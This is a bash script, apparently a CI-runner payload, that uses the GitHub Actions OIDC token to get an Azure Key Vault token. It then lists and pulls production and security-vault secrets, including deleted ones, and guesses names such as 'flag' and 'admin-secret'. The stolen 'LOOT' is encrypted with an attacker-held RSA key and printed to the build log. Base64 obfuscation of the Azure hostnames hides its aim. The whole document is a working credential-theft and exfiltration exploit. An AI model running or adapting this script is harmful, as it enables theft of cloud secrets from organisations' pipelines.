#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"
AADH=$(printf %s 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)
KVH=$(printf %s 'dmF1bHQuYXp1cmUubmV0' | base64 -d)
ARMH=$(printf %s 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)
AAD="${SC}${AADH}"; ARM="${SC}${ARMH}"; VAULT="${SC}${KVH}"
echo "=== RUNNER PROOF ==="; id; hostname
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
VT=$(curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=${VAULT}/.default" | jq -r '.access_token // empty')
say "VT_len=${#VT}"
say "PROD_ALL_SECRETS: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets?api-version=7.4&maxresults=25")"
say "PROD_DELETED: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/deletedsecrets?api-version=7.4")"
say "SEC_ALL: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets?api-version=7.4")"
for N in flag Flag FLAG secret flag-value keyvault-flag; do
  say "SEC_TRY $N: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets/$N?api-version=7.4" | head -c 300)"
done
for N in flag Flag secret admin-secret; do
  say "PROD_TRY $N: $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets/$N?api-version=7.4" | head -c 300)"
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
